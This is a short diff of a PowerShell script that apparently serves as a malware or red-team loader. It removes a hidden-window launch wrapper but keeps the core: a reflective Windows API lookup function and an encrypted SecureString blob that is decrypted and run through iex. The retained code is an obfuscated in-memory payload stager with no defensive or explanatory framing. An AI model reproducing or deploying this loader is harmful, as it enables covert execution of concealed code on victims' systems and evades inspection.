@@ -1,4 +1,3 @@
-start powershell -windowstyle h -args @"
 function LookupFunc {
     Param ($moduleName, $functionName)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
@@ -65,5 +64,3 @@ $data = "76492d1116743f0423413b16050a5345MgB8ADcAMABaAE0AZABjAFEATgBhAGMAOQBHAGk
 sleep 2
 
 iex (New-Object System.Net.NetworkCredential("", (ConvertTo-SecureString -key $key $data))).Password
-
-"@
